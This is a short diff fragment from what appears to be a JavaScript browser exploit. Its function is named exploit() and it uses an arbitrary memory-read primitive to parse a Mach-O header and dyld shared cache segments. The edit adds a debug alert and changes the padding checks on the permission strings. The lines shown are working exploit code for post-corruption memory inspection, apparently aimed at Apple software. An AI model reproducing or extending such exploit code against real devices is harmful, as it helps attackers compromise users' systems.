@@ -588,6 +588,7 @@ function exploit(){
 }
         alert('Mach-O header' + ab2str(memory.read(hdr,0xf8)))
         var base_seg = null;
+        alert("nsegs test" + memory.read_i32(hdr+0x14))
         var nsegs    = memory.u32(Add(hdr, 0x14));
         var segdata  = memory.read(Add(hdr, memory.u32(Add(hdr, 0x10))), nsegs * 0x20);
         var segs     = [];
@@ -629,10 +630,10 @@ function exploit(){
             if(seg.initprot & VM_PROT_EXECUTE){
                 init_rights += "x";
             }
-            if(max_rights.length < 3){
+            if(max_rights.length < 4){
                 max_rights = "-" + max_rights;
             }
-            if(init_rights.length < 3){
+            if(init_rights.length < 4){
                 init_rights = "-" + init_rights;
             }
             log("DYLD Shared cache segment ("+seg.addr.toString(16)+"-"+Add(seg.addr, seg.size).toString(16)+"): "+init_rights+"/"+max_rights);
